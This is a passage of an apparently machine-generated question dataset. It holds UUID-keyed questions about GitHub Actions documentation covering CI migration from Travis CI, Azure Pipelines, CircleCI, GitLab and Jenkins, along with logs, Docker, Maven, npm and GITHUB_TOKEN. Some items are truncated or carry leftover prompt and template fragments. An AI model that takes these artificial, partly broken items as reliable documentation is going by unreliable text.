`migrate` command to convert a Travis CI pipeline to a GitHub Actions workflow, and what is the output of this command", "165d6633-0d8d-4262-bfe5-6e2d0aa38eb8": "What environment variables does {% data variables.product.prodname_actions_importer %} use to connect to a Travis CI instance during the migration process?", "2d6cc6c4-b4e2-49bc-8248-a9453f03f360": "What is the purpose of using the `TRAVIS_CI_ACCESS_TOKEN` environment variable in {% data variables.product.prodname_actions_importer %}", "90c1ab76-5543-4f48-9da1-29c43365aee8": "How can you specify the source file path for {% data variables.product.prodname_actions_importer %} using the `--source-file-path` argument? Provide an example command.", "f4310f18-e4ac-41b9-b5fb-aeb52d111c3f": "How does {% data variables.product.prodname_actions_importer %} fetch pipeline contents from source control, and what argument is used to specify source files instead", "e3e689fe-0251-4b8b-9169-42e494aa3be9": "In what format should the configuration file be for auditing a Travis CI instance using {% data variables.product.prodname_actions_importer %}, and what value must be unique for each `repository_slug`?", "d23829ce-5869-4531-8a55-be58382d725c": "Which constructs in Travis CI are partially supported in {% data variables.product.prodname_actions %} according to the context information provided?", "bfc3ee1c-6ab6-42c4-8a4c-34b12285b802": "How does {% data variables.product.prodname_actions_importer %} convert Travis CI environment variables to their closest equivalent in {% data variables.product.prodname_actions %}", "b90dba4f-dfe2-47bd-af2d-305e32b60097": "How can we obtain the value of the variable `$USER` in this context", "44e549c9-90f2-4680-8cb5-75ec53288534": "What is the number of the current pull request in this context", "a55b8049-a38a-4106-9c27-8badf6a99072": "What is the name of the branch that is being merged into the base branch in this context", "2edbd23c-24b8-4e62-87d4-806b0729c417": "What is the difference between the variables `$TRAVIS_BUILD_ID` and `$TRAVIS_BUILD_NUMBER` in this context", "e76d9ab5-1650-494a-95ff-4bb68d46f1af": "What is the location of the user's home directory in this context", "28910461-3f41-4f77-befd-00886d50a2a1": "What is the SHA of the commit that triggered", "06a52ffc-d264-4723-97f8-201eb8eefbd5": "What is the name of the current branch being built in this context", "73021709-f2b8-4b54-8bb3-50d5de47543a": "What is the name of the event that triggered this build in this context", "b62242ea-487c-47af-9552-cd9ad39b4ebb": "What is the value of the variable `$CONTINUOUS_INTEGRATION` in this context", "0b9600b9-ced0-4cbd-a897-786477a7d4a9": "What is the identifier for the current build in this context", "a067abbd-d246-45a3-91b0-3f4590b86607": "What is the value of the variable `$TRAVIS_TAG` in the current context", "c049946f-0c61-468e-9987-22c060e17e00": "What is the unique identifier for the current job being executed, as represented by the variable `$TRAVIS_JOB_ID`", "7fc3591c-4271-4fb0-92a7-4c5b513a9b48": "What is the value of the variable `$TRAVIS_PULL_REQUEST_SLUG` in the current context", "4da677be-5eab-4658-9257-544db15ea987": "What is the name of the operating system being used in the current context, as represented by the variable `$TRAVIS_OS_NAME`", "336b8af7-ff72-429f-a9b9-9099d7c6e295": "What is the name of the repository being used, as", "afa2cd79-fc48-4a61-98a4-0af096f14314": "What is the URL for accessing the current build being executed, as represented by the variable `$TRAVIS_BUILD_WEB_URL`", "320eeaf1-85bc-4f7b-bdca-ee96cb6554a0": "What is the unique identifier for the current repository being used, as represented by the variable `$TRAVIS_REPO_SLUG`", "6deb5edb-b030-4424-87a9-0c68639c7a15": " What are the optional parameters available in {% data variables.product.prodname_actions_importer %} and how can they be used to customize the migration process", "8cf28514-a56a-4889-ad0b-279b646c6611": " How can {% data variables.product.prodname_actions_importer %} be used to limit which actions are allowed in converted workflows, and what options are available for this purpose", "fa91fe85-b261-4ba1-9b89-bd9d3656ddd0": " How can {% data variables.product.prodname_actions_importer %} be used to authenticate to different servers when build scripts are stored in multiple {% data variables.product.prodname_ghe_server %} instances, and what format should the credentials file take?", "14066579-6e26-440e-8807-a31be399c9a8": "How can the `--features` option be used to limit the features used in workflows created by {% data variables.product.prodname_actions_importer %} when migrating to an older {% data variables.product.prodname_ghe_server %}", "bae2f9a1-7a1c-4774-ad65-4aef497067fd": "How can {% data variables.product.prodname_actions_importer %} fetch source code from non-{% data variables.product.prodname_dotcom %} repositories using a credentials file with a `provider` value of `gitlab` and an access token `super_secret_token`", "7a42c0d0-76b8-4450-9cd4-800d876c23db": "How does {% data variables.product.prodname_actions_importer %} authenticate network requests to `https://github.com` for the provided credentials file with access token `ghp_mygeneraltoken` and organization-specific token `ghp_myorgspecifictoken`", "a9a9e613-265e-4a94-aed4-190ca36b89b0": "What is the purpose of using feature flags in GitHub Actions, and how can they be enabled or disabled using the `gh actions-importer` command", "fdb9991e-66c9-4b8d-ac93-f44c02bce03d": "How can I interactively configure feature flags using the `configure --features` command in `gh actions-importer`? Provide an example of how to disable the `composite-actions` and `actions/cache` feature flags using this command.", "8d0a9d6c-4053-4e71-85a7-036492e5f4a8": "What environment variables should be set to access servers configured with a HTTP proxy using {% data variables.product.prodname_actions_importer %}", "09ad2b12-4607-4394-aad7-3f17fab4e531": "How can network response caching be disabled using the \"--no-http-cache\" option in {% data variables.product.prodname_actions_importer %}", "3c52fa83-1b00-4e69-9e9d-5a3bf9eb01d6": "How can SSL certificate verification be disabled using the \"--no-ssl-verify\" option in {% data variables.product.prodname_actions_importer %}", "2e12c693-df78-44f3-aa7a-1919892eadea": "What is the purpose of the \"/data\" directory in {% data variables.product.prodname_actions_importer %} and how should path arguments be used when running the tool", "c81badc4-11ff-4a6a-ad6e-decf0fc41457": "How can the audit summary be outputted to a specific directory using {% data variables.product.prodname_actions_importer %}", "be54c8cf-8ec5-4d72-b625-bff7bd9d4e35": "What is the difference between the \"actions/cache\"", "7a86e01d-360b-4b25-a1c8-648191a6cf3d": "What legal notice should I be aware of when using GitHub Actions importer?", "5f772949-d758-4d43-8150-baf6bda669c8": "How can I specify the output directory for GitHub Actions and disable SSL verification in a single command", "61bcef7b-bab7-4f40-ab86-3e0c38866d88": "When migrating from Azure Pipelines to {% data variables.product.prodname_actions %}, what are the key differences that should be considered, and how can jobs and steps be migrated between the two systems?", "1c8766b0-7757-4e77-b26e-0d30c4a42e79": "How do Azure Pipelines and {% data variables.product.prodname_actions %} differ in terms of workflow configuration, and what are the key similarities between the two systems", "406d2362-24f1-4ea5-90f7-091cc164c826": " How can script steps be configured to run sequentially in Azure Pipelines and {% data variables.product.prodname_actions %}", "67ad81b0-a49f-49d3-8903-593462cefd26": " What are the differences in script error handling between Azure Pipelines and {% data variables.product.prodname_actions %}?", "c80173b7-e50c-4a45-b90c-eb60b8c6b939": " How does the syntax for specifying the Command shell differ between Azure Pipelines and {% data variables.product.prodname_actions %}? Provide an example of each syntax.- What are the differences in built-in commands, variable expansion, and flow control between PowerShell and the Command shell? How can I update my script to run in PowerShell instead of the Command shell in {% data variables.product.prodname_actions %}? Provide an example of each syntax.", "6849f5e9-ec21-4ed3-af45-fb7389cbb4f7": " How do the syntax for conditional expressions differ between Azure Pipelines and {% data variables.product.prodname_actions %}", "fad707dd-d74b-489f-afb5-4395f1bb1d57": " How can dependencies be set between jobs in both Azure Pipelines and {% data variables.product.prodname_actions %}?", "1069e253-9d47-41eb-994d-5311c2294f59": " How does the syntax for dependencies between jobs differ between Azure Pipelines and {% data variables.product.prodname_actions %}? Provide an example for each system.- How can actions be used to perform tasks and customize workflows in {% data variables.product.prodname_actions %}, and what resources are available for finding and creating actions? Provide an example of an action and its usage.", "2f4f9e75-24f4-44a4-9d10-6eda851de29e": " Can you provide examples of how to configure dependencies between jobs in {% data variables.product.prodname_actions %}, and how does this compare to the `requires` syntax in CircleCI?", "2c820251-4e0d-47b8-bfca-55058d55f708": " How do CircleCI and {% data variables.product.prodname_actions %} differ in terms of workflow configuration, and what are the key considerations for migrating from CircleCI to {% data variables.product.prodname_actions %}", "6571f34c-fb51-43c6-8bd4-0dc36ba6ed85": "What is the difference between using Docker images in CircleCI and {% data variables.product.prodname_actions %}", "82887e10-bdaa-4d5c-9dd4-2cc811260657": "How does CircleCI and {% data variables.product.prodname_actions %} provide reusability in workflows", "7f6d491c-47bc-4770-b0d1-a6e16cefdd5c": " How do CircleCI and {% data variables.product.prodname_actions %} enable persisting data between jobs", "a213fa10-c20b-4695-b77d-e25c6d2d9338": " How does {% data variables.product.prodname_actions %} differ from CircleCI's Docker Layer Caching (or DLC)", "45644458-31b7-4df8-bcf7-7ea3492d4c28": " How can databases and service containers be utilized in both CircleCI and {% data variables.product.prodname_actions %}?", "075d89fe-4730-4532-8b55-091cd043aae8": " How does CircleCI and {% data variables.product.prodname_actions %} support setting variables in the configuration file and creating secrets using the CircleCI or {% data variables.product.product_name %} UI", "fd05f7fd-7135-424c-b81d-54b395471606": " What is the syntax for caching in CircleCI and {% data variables.product.prodname_actions %}", "02f3615f-9a34-48c9-ab5d-47cf84bcfd9c": " How can I include additional containers for databases, caching, or other dependencies in CircleCI and GitHub Actions configuration? Provide an example in both configuration syntaxes.- How can I set up a health check for a service container in GitHub Actions configuration? Provide the necessary options in the configuration syntax.", "8e638c70-2e29-43cb-a69b-3da4ecb98dfb": " How does the CircleCI configuration file differ from the {% data variables.product.prodname_actions %} configuration file in terms of setting up environment variables and caching dependencies? Provide specific examples from the given context.- What is the purpose of the \"dockerize\" command in the CircleCI configuration file, and how is it used to wait for the database to be available?", "272011ea-aa3a-4f5c-a017-90ea226b83f8": "How does the use of Docker in the workflows contribute to the overall testing and development process, and what benefits does it provide compared to traditional testing methods", "14f00dd9-8860-4fec-803b-ddf56629df01": "Can you summarize the purpose of the provided context information and explain how it relates to the setup of questions for an upcoming quiz/examination", "5186a4da-312c-45c8-bbc6-9e5cab99fdba": "How does the use of health checks for the PostgreSQL service in the workflows help to ensure the reliability and availability of the database during testing, and what potential issues could arise if these checks were not implemented", "c9867089-ee89-4c4e-8554-2ddf21ae5a33": "What is the purpose of the \"cache dependencies\" step in the workflows, and how does it help to improve the efficiency and reliability of the testing process", "53f9c5e5-eb59-4854-a30a-a1a2aca2a43f": "Can you explain the difference", "8c100467-9ba2-4138-b36f-182a10558dce": "Based on the provided context information, can you identify the specific versions of Ruby and PostgreSQL being used in the workflows, and explain the significance of these choices", "dc24f24e-4672-4a83-b9e2-32a5542e499b": "What is the purpose of the following command in the context provided: \"bundle exec appraisal install\"", "956566e1-a404-40f1-86a5-76513014b49e": "How does the command \"bundle exec appraisal rake\" differ from the command \"bundle exec rake\" in the context provided?", "a1ffbbc7-22d3-4d2a-9cd0-1a145b146e54": " How do jobs differ between GitLab CI/CD and {% data variables.product.prodname_actions %} in terms of configuration syntax and platform support", "f4de943b-91ce-4b2a-9e8a-df4183fdb596": " What are the similarities and differences between workflow configuration files in GitLab CI/CD and {% data variables.product.prodname_actions %}, and how can I migrate my workflow from GitLab CI/CD to {% data variables.product.prodname_actions %}?", "bcccf8b5-03ac-4219-ba5f-2411c2b38b8d": " What is the syntax for defining conditions and expressions in GitLab CI/CD and how does it compare to the syntax for {% data variables.product.prodname_actions %}?", "99ff39b1-31d2-4735-a5c1-728b999d1693": " How does the syntax for defining Docker images differ between GitLab CI/CD and {% data variables.product.prodname_actions %}", "727f1aaf-4ffa-4f50-8fea-da750a670888": " How does {% data variables.product.prodname_actions %} allow for job dependencies to be explicitly specified, and how does this differ from GitLab CI/CD's concept of stages? Provide an example of each system's syntax for dependencies between jobs.- Can you explain the benefits of using job dependencies in both {% data variables.product.prodname_actions %} and GitLab CI/CD, and provide a scenario where this feature would be particularly useful?", "cc1cd3aa-dc30-44b8-b25d-b0c4b7088bb8": " How can artifacts be uploaded as files and directories in GitLab CI/CD and {% data variables.product.prodname_actions", "dd048aef-934f-4135-bb46-871da90620af": " How can GitLab CI/CD and {% data variables.product.prodname_actions %} be used to persist data across multiple jobs", "88ef9c6b-26be-4506-964b-c9db987ed187": " How can workflows be scheduled in GitLab CI/CD and {% data variables.product.prodname_actions %}", "38f76c2a-3fee-434d-a744-150dd92d67f5": " What is the difference in caching syntax between GitLab CI/CD and {% data variables.product.prodname_actions %}", "65913fc6-a92a-4c2e-803d-5792c3e76023": " What is the syntax for caching and artifacts in GitLab CI/CD and {% data variables.product.prodname_actions %}", "54e39e15-78b2-43c1-b88f-50d4b41f58c9": " How can variables and secrets be set in GitLab CI/CD and {% data variables.product.prodname_actions %}", "01c5ca25-d858-4237-9494-877d66c81caf": " How does the syntax for databases and service containers differ between GitLab CI/CD and {% data variables.product.prodname_actions %}? Provide an example for each system.- What is the purpose of the `services` key in both GitLab CI/CD and {% data variables.product.prodname_actions %} syntax for databases and service containers? Provide an example for each system.- How is context information used in the provided text material? Can you summarize the context provided", "a6f213f6-81c0-48c7-b0bb-f5d14341f6c0": " What is the significance of the `image` key in GitLab CI/CD syntax for databases and service containers? Provide an example.- What is the role of the `container` key in {% data variables.product.prodname_actions %} syntax for databases and service containers? Provide an example.- How does the `script` key in GitLab", "5f631ec1-f08a-4ea2-b038-38f9122d0fd6": "What is the purpose of setting the environment variables POSTGRES_HOST and POSTGRES_PORT in the context information?", "714e989a-6638-472c-8dbb-50c873963676": "How does the client in the provided context information interact with the PostgreSQL service container", "9cc33406-d103-4a94-856f-649512c5a351": "What approach does {% data variables.product.prodname_actions %} offer for distributing builds, and how does it compare to Jenkins' capabilities in this regard?", "1d421ef6-3206-4c82-ab91-0c34f039587b": "How do Jenkins and {% data variables.product.prodname_actions %} differ in terms of syntax for creating pipelines", "873ca7da-8692-49e5-b55e-e35b183866c9": "What are the differences between parallel job processing in Jenkins and parallel job processing in {% data variables.product.prodname_actions %}?", "35496639-a203-4ca3-aeaa-1ee26f4180a4": "How does Jenkins manage Declarative Pipelines using directives, and how does this compare to the concept of workflows in {% data variables.product.prodname_actions %}", "eff16b6f-fd1c-4320-a5c1-580676c5efb6": " How does {% data variables.product.prodname_actions %} and Jenkins differ in terms of defining system combinations using matrices? Provide specific examples.- How do {% data variables.product.prodname_actions %} and Jenkins execute tasks using steps and stages? Provide specific examples.- How do {% data variables.product.prodname_actions %} and Jenkins schedule pipelines using cron? Provide specific examples.- How do {% data variables.product.prodname_actions %} and Jenkins configure environment variables in pipelines? Provide specific examples.- How do {% data variables.product.prodname_actions %} and Jenkins build from upstream projects? Provide specific examples.- How do {% data variables.product.prodname_actions %} and Jenkins build with multiple operating systems? Provide specific examples.", "adb48fba-b5e8-4253-a5a8-7d989faa3f8a": "How can we configure a {% data variables.product.prodname_actions %} workflow to build with multiple operating systems? Provide a step-by-step guide with specific examples of the YAML syntax required.2. How can we add context information to a {% data variables.product.prodname_actions %} workflow to provide additional details about the environment or dependencies required for the workflow to run successfully? Please provide instructions on where to add this information and how to format it correctly.", "19f1a155-704b-41c9-82ac-b25b347fb228": " What are the key similarities between {% data variables.product.prodname_actions %} and Travis CI, and how can understanding these help with migration", "ef4a51cd-17c7-4d33-a213-4e2de42cc6b8": " How does {% data variables.product.prodname_actions %} compare to Travis CI in terms of job execution", "9837a682-15b6-46f0-83c9-221883022a84": " How can you target specific branches in Travis CI and {% data variables.product.prodname_actions %}, and what is the syntax for checking out submodules in each system?", "27e2bdfa-3abc-4c98-99a3-1cefc1329c40": " How does Travis CI and {% data variables.product.prodname_actions %} support status badges, and what is the syntax for using a matrix in each system", "f4b71980-a520-4495-a5a2-864f652d2672": "How does {% data variables.product.prodname_actions %} allow for the storage and sharing of secrets, and what restrictions are in place to limit access to these secrets", "2de7bd9c-1a9d-4bfe-b821-cabd5634907b": "What are the key features of {% data variables.product.prodname_actions %} that should be considered during migration from Travis CI, and how do these features differ from those offered by Travis CI? (specifically, discuss storing secrets, sharing files between jobs and workflows, hosting your own runners, concurrent jobs and workflow execution times, and language support.)", "03069daf-7b39-45ac-97f4-393bd14abd64": " How can error handling be approached differently in {% data variables.product.prodname_actions %} compared to Travis CI? Provide examples of script and job error handling.- How can conditionals and expressions be used in {% data variables.product.prodname_actions %} to control the execution of jobs and steps? Provide an example of using an `if` conditional to prevent a step from running.", "c9897dc1-1ca8-4988-9dfb-f7e01a6fd56b": " How does the syntax for caching dependencies differ between Travis CI and {% data variables.product.prodname_actions %}", "66ecf374-4910-4d5d-8f0f-47ac1c6972a1": " How do you configure environment variables in a {% data variables.product.prodname_actions %} job compared to Travis CI?", "f9933b8f-547a-47b9-add2-4908b0320031": " How can I set up an environment variable for Maven in a Travis CI workflow", "ae7557ff-0bed-4b5e-9302-563564f16d33": " How can I build a Node.js project using {% data variables.product.prodname_actions %} workflow?", "3ba0f064-3829-4494-b02f-fec8999e8aab": "How can I view the status of each job and step in a workflow, and where can I find this information", "c0a4ba69-96bf-49bb-a37a-b325cbb0e345": "How can I enable additional debug logging for a workflow, job, or step if the provided logs are not sufficient for troubleshooting", "aa296a23-894d-4057-83ae-f7e329cab312": "How can I add a workflow status badge to my repository, and what benefits does this provide", "e82e7abe-2fb9-4d9b-b76f-a42a32ec8413": "How can I view the activity logs for a specific workflow run, and where can I find these logs", "63099262-2903-499f-bc49-6349be14d559": "How can I view the execution time of a specific job in a workflow, and where can I find this information", "e7b44819-7694-4ab3-bd34-8a7c099df591": "How can I cancel a workflow if it's not working as expected, and what should I avoid doing to prevent hanging cancellations", "537f5fda-38e7-40e9-8a39-58fb9a3270de": "How can I monitor and troubleshoot self-host", "d3899d41-7708-4a78-a7b5-412b85812e7e": "How can I monitor the progress of my workflows using the visualization graph provided", "08762833-a434-4406-8488-ebcb7f0bf5f1": "How can I modify the URL for a workflow status badge to show the status of workflow runs triggered by the push event?", "3d04fff7-e2aa-47ff-b6d9-26d16f7e116a": "How can I display the status of a workflow run for a specific branch using a badge in my repository's README.md file", "1d750a8d-3b10-4915-9ec2-3289d6565172": "What is the difference between runner diagnostic logging and step debug logging, and how can each be enabled in a repository containing a workflow?", "64999822-9544-4ab1-9f1b-d12145cd5830": "How can runner diagnostic logging be enabled in a repository containing a workflow, and where can the resulting logs be downloaded from", "ec5bdde3-5817-47b7-b639-e54e21244bc4": " What is the feature in GitHub Actions that allows me to receive notifications about workflow runs?", "5c084485-5c68-4546-81aa-2e9f023909d6": " How can I subscribe to notifications about workflow runs that I trigger using GitHub Actions", "1b43eea7-ec8b-492f-8b51-e3d207b07fb6": "How can the visualization graph be used to monitor and debug workflows during a workflow run", "6511c10b-95f3-4cae-8a66-b91b6f92dd58": "What information can be obtained from the icons displayed to the left of the job names in the visualization graph?", "50877e78-9810-4cee-b002-f0926880b9f5": "How can I search for specific steps in the build logs of a workflow run on GitHub", "8a2fddd1-b366-47fb-a5bc-1208c8dac238": "How can I download the log files or artifacts from a workflow run on GitHub", "ead88de4-cb19-4b86-8eb8-7b6b26ad1a1b": "How can I view logs to diagnose failures in a workflow run on GitHub", "ddfb7125-1ecd-461d-a8b5-c73e016f0844": "How can I download the log archive for a specific job in a workflow using the GitHub web interface", "bb8f8806-1540-4f73-b9ff-86ae58366468": "How can I delete all log files for a specific workflow run using the GitHub web interface or programmatically?", "ff2a1600-a89b-49a1-926e-285cb305fd81": "How can I delete all logs for a specific workflow in a GitHub repository using a script? Provide step-by-step instructions and any necessary scripting language syntax.2. How can I view the logs for a specific job in a GitHub Actions run using {% data variables.product.prodname_cli %}? Please provide the necessary command and any required arguments.", "69a77f37-c635-4676-b572-dc245e1c924c": "How can I view the logs of a specific job in a recent run using GitHub CLI? Please provide step-by-step instructions including any necessary flags or commands.2. How can I filter the logs to only show entries for failed steps in a specific job using GitHub CLI? Please provide step-by-step instructions including any necessary flags or commands.", "7296d1a7-a959-470a-81e1-b7c87a26827d": "How can I view the execution time of a job in {% data variables.product.prodname_dotcom %} using {% data variables.product.prodname_actions %}", "c80d983f-0ee1-4f6b-bd48-543608a0f110": "How can I view the billable job execution time for a private repository using {% data variables.product.prodname_dotcom %}-hosted runners in {% data variables.product.prodname_actions %}?", "3ecdc132-6b8d-4f25-af43-37a245233e07": "How can I view the recent workflow runs using the gh cli", "b28bb221-8344-49e8-9272-4c878ee8acc0": "How can I view the details of a specific workflow run, including job steps, using the gh cli?", "6f4d5c6f-f119-48fa-985f-0048ee13a4e3": "How can I ensure that the title of my document is automatically generated based on its content using \"AUTOTITLE\"?", "8189d452-442c-449b-a1ad-16cb732387d7": "What is the purpose of using \"AUTOTITLE\" in a document", "85bbf291-936b-403d-a8ed-e0d188fa9ad5": "Generate according to: IntroductionThis guide shows you how to create a workflow that performs a Docker build, and then publishes Docker images to Docker Hub or {% data variables.product.prodname_registry %}. With a single workflow, you can publish images to a single registry or to multiple registries.{% note %}**Note:** If you want to push to another third-party Docker registry, the example in the \"Publishing images to {%", "17391fd1-d55b-4cb7-a080-81defade249d": "What prerequisites are necessary to follow the guide for publishing Docker images to Docker Hub or {% data variables.product.prodname_registry %} using GitHub Actions", "894a184a-3b6a-4906-9629-894ecab790d4": "How can I create a workflow that performs a Docker build and publishes Docker images to Docker Hub or {% data variables.product.prodname_registry %} using the provided guide", "19f5b05a-21be-493c-a2ef-2d55240e8abb": " What is the required option for specifying the tags of a Docker image in GitHub Actions using the `build-push-action`", "130ef336-44fb-41d9-812f-b159a2c232d2": " What is the recommended way to extract metadata, such as tags and labels, for a Docker image in GitHub Actions using the `metadata-action", "ee5e09a3-f4b4-4c04-acad-620abf8f227e": " What is the recommended way to store Docker Hub username and password in GitHub Actions", "6caeb46c-4b2c-4906-8f33-53ede80b9eea": " What is the recommended type of tag to use when specifying multiple tags for a Docker image in GitHub Actions using the `build-push-action`", "731e4a98-b13e-4ec3-a8a4-d00bbd838b58": " What is the required option for specifying the metadata of a Docker image in GitHub Actions using the `metadata-action`", "75f9487c-932c-42e5-bdf0-e44e23cf1874": " What are the required options for logging in to Docker Hub using the `login-action` in GitHub Actions", "b47cb8f3-f615-481b-911c-4df1a1a60527": " What is the recommended way to ensure the security of Docker Hub credentials in GitHub Actions", "1cf4249e-eb95-4abe-b255-9294cf0d79cb": "How can I automate the process of building and pushing Docker images to {% data variables.product.prodname_registry %} using GitHub Actions? Provide step-by-step instructions and necessary configurations for the workflow.2. What are the required options for the `login-action`, `metadata-action`, and `build-push-action` when publishing images to {% data variables.product.prodname_registry %} using GitHub Actions? Explain the purpose and usage of each option.", "c574287e-b115-487a-a29b-b8265139f470": " What is the purpose of the `login-action` and `build-push-action` in the provided workflow for publishing a Docker image to the GitHub Package Registry?", "f9d037b4-17cf-4a64-be78-5728249375cf": " How can tags be set for a Docker image stored on GitHub Package Registry, and what format should be followed for setting tags", "ceb1c603-3600-4689-8102-5c9dceedb20f": " How can I log in to a Docker registry using the `login-action` and `build-push-action` actions in a GitHub workflow to publish a Docker image to multiple registries", "4c2ec9d7-6ed0-4daa-aeac-556757c6f038": " How can I use the `login-action` and `build-push-action` actions in a GitHub workflow to build and push a Docker image based on a repository's `Dockerfile`, and apply the commit SHA and release version as image tags to a Docker registry?", "8d48d5f7-144a-48c5-91d9-6ab80c0ccc4d": "  - How can I automate the process of pushing a Docker image to multiple registries using GitHub Actions? Provide step-by-step instructions and necessary configurations required for this task.  - What are the different ways to log in to Docker Hub and the GitHub Container Registry using GitHub Actions? Explain the differences between these methods and when to use each one. Provide examples and best practices for securing these credentials.", "0a08a3b5-2b57-4068-9e96-71dec83ca5e7": "What is the purpose of the `login-action` in the provided workflow", "245e24c1-e476-477a-ae48-b4b502348fe9": "How does the `metadata-action` action generate tags and labels in the workflow?", "5c272f5a-bbc6-4d38-a677-57b0e2705868": "How can you define a new Maven repository in the publishing block of your _build.gradle_ file to publish packages to the Maven Central Repository through the OSSRH hosting project, and what are the necessary configuration steps involved?", "fad036c0-d044-42a3-a248-11e9d602d3e7": "What is the significance of the `groupId` and `artifactId` fields in the `MavenPublication` section of the _build.gradle_ file, and how do they contribute to the unique identification of a package in registries", "a20da506-0dba-41a1-9bfc-fec69537edb8": " How can I set up a workflow to publish a package to the Maven Central Repository using Gradle and GitHub Actions? Provide step-by-step instructions and any necessary configuration details.- What are the benefits of using secrets in a GitHub Actions workflow to authenticate to a Maven repository, and how can I properly set up and utilize these secrets in my workflow?", "8f9a4c01-13af-4bef-a0e6-486117141bdb": " Can you explain the purpose of setting the `GITHUB_TOKEN` environment variable in the CI workflow run, and what permissions are required for this variable?", "05d52a4d-a19e-4e76-a68c-2c85cd8dc562": " How does the provided workflow publish a package to GitHub Packages, and what environment variables are used in the Maven repository configuration", "3aa46ac3-caf9-4c8f-abf2-2dd661b6814a": "Generate according to: Context information is below.---------------------ate Gradle wrapper        uses: gradle/wrapper-validation-action@ccb4328a959376b642e027874838f60f8e596de3      - name: Publish package        uses: gradle/gradle-build-action@749f47bda3e44aa060e82d7b3", "6ff47f0f-defb-47fa-9052-ee684094e79f": " What is the purpose of specifying a repository for both my {% data variables.product.prodname_dotcom %} repository and my Maven Central Repository provider in my _build.gradle_ file", "03caaf70-cf29-42d3-bb65-e6d9aaac53c1": " How can I configure my _build.gradle_ file to publish packages to both the Maven Central Repository and {% data variables.product.prodname_registry %}", "3430efdf-ee47-4b35-8cb8-6fc0b2e120ce": " How can I configure Gradle to publish a package to both the Maven Central Repository and GitHub Packages using environment variables for authentication? Provide an example Gradle build file and GitHub Actions workflow.- How can I ensure the security and integrity of my package during the publishing process to both the Maven Central Repository and GitHub Packages using environment variables for authentication? What measures should I take to prevent unauthorized access or tampering? Provide best practices and recommendations.", "077ecc1c-d4f9-43f3-8265-59ac12f567de": "What is the purpose of setting a `GITHUB_TOKEN` environment variable in a workflow", "fee48512-fe46-4b57-902c-13875589cec6": "How does the `permissions` key in the context information determine the access granted to the `GITHUB_TOKEN` secret?", "fad3dc2b-da65-4c4e-9661-3d3f514fef3d": "How can the `setup-java` action be used to publish Java packages to the Maven Central Repository during the CI workflow? What configuration options are available for this action?", "2f90498f-573f-43e4-b11a-74265b3b387d": "What is the purpose of configuring the deployment repository and authentication for it in the _.m2/settings.xml_ file during package publishing using Maven", "f8ae7d24-af0b-429d-b429-7c8a9d759766": " How can I specify a distribution management repository during the `setup-java` action invocation in a Jenkins workflow, and what environment variables do I need to provide to authenticate to the repository", "462b45fb-8bba-465a-ae4d-c991f07155b3": " Can you provide an example of how to configure a distribution management repository with an `id` of `ossrh` in a Maven _pom.xml_ file, and what steps are required to publish a package to the Maven Central Repository using this repository?", "2d847ce9-b826-4818-a455-c5e3dce7e797": " Can you provide an example of how to configure the distribution repository in the _pom.xml_ file for publishing to {% data variables.product.prodname_registry %} using the automatically generated _settings.xml_?", "b5ccfc69-32e1-4235-855f-b729c1067167": " How can I set up a workflow to publish my Maven-based project to {% data variables.product.prodname_registry %} using environment variables for authentication", "c65f0279-d868-4b76-9a24-9cb6d1bdaed7": " What steps does the provided workflow take to publish a package to GitHub Packages, and how can I modify it to publish to the Maven Central Repository as well?", "fb7f3b90-313a-4954-8611-75bd6b535790": " How can I publish my package to both the Maven Central Repository and GitHub Packages using the provided workflow", "c94e77b5-b32e-4e71-9d8a-ea96956fef07": "What environment variables are used for authentication in the provided workflow when publishing to the Maven Central Repository and GitHub Packages?", "229299de-1c9e-477a-8379-8f8ddfba041d": "How does the provided workflow configure Maven for publishing packages to both Maven Central Repository and GitHub Packages", "e6588e91-d444-44f8-bcf6-1ac89b77b37c": "How can I configure the `publishConfig` fields in my `package.json` file to limit publishing to a specific registry", "87f744ac-f785-4a1e-83e4-180115710a2e": "How can I specify the Node.js version installed on the runner using the `setup-node` action", "5f539fe0-5d35-4948-add6-7474f18473fc": "What is the `registry`", "6fe220e1-e5ec-47cc-a3cb-80c67519236e": "How can I create a workflow that publishes Node.js packages to both the {% data variables.product.prodname_registry %} and npm registries after continuous integration (CI) tests pass", "04047570-0573-4e8f-adff-edfac5708a58": "What is the difference between the `name` and `version` fields in the `package.json` file and how do they relate to package identification in registries", "67c42e31-b6d0-4d7a-aba1-2de3ae861fee": "What are the prerequisites for creating a workflow that publishes Node.js packages to the {% data variables.product.prodname_registry %} and npm registries after CI tests pass", "b896fd32-68c0-4bf9-a831-92038188b5e9": "How can one store their npm authentication token as a secret for publishing packages to npmjs? Provide step-by-step instructions with examples.2. What is the default name used by npm to publish packages to the global namespace, and how can one publish a package with a scope prefix? Please provide detailed instructions with examples.", "0d64e55f-f051-4942-b83b-4f36a57b6c10": "What is the difference between publishing a package without providing the repository key in the package.json file and providing the repository key in the package.json file for publishing to npmjs.org using {% data variables.product.prodname_registry %}?", "6a467bc2-59f9-4666-bc7c-33fffd733983": "How can I properly configure my credentials for publishing packages to npmjs.org using the setup-node process", "ff86a3aa-9018-404c-afcc-2f858d060aeb": "How can I authenticate my workflow to publish a package to a different repository in the {% data variables.product.prodname_registry %} registry? Provide step-by-step instructions and any necessary code snippets.2. How can I set up an .npmrc file to publish to GitHub Packages using the {% data variables.product.pat_v1 %} in my workflow? Please provide detailed instructions and any necessary code snippets.", "106f199c-0232-40f2-a0f4-20401ac86b57": " How can I set up a workflow in GitHub Actions to automatically publish a package to npmjs when a release is triggered? Provide step-by-step instructions and any necessary configuration details.- What is the purpose of the `yarn npm publish` command in the provided GitHub Actions workflow, and how does it differ from `yarn publish` in Yarn version 1? Please explain in detail.", "c45ae8e5-f39d-4924-ba4a-550a490637d8": "How can the `GITHUB_TOKEN` secret be used in a workflow, and what are some examples of its usage", "eb0447ae-de4a-4739-982f-36d9af351516": "What is the purpose of the `GITHUB_TOKEN` secret in a GitHub workflow, and how is it created", "18e7ef93-dfe9-4a31-ad0b-7e36413ce271": "What is the context in which the `GITHUB_TOKEN` secret is available", "96d209c1-5d32-4430-965b-51c479538567": "What are the potential security risks associated with using the `GITHUB_TOKEN` secret, and how can these risks be mitigated", "a8d5c6e4-30a8-49df-9893-30ad2cba039a": "How long does the `GITHUB_TOKEN` secret remain valid, and when is a new token generated for each job", "13942c99-7bc9-49ac-a615-bb7851cbfeff": "What is the difference between the `GITHUB_TOKEN` secret and the installation access token generated by the GitHub app installed on a repository", "4f1ed81b-fd27-4134-9a1a-23a7e6f019ca": "How can actions be limited in their access to the `GITHUB_TOKEN` secret to ensure minimum required permissions", "56fd0ae6-2e84-4204-972f-17041c12fd91": "How can the `GITHUB_TOKEN` be passed as an input in a GitHub Action workflow, and what 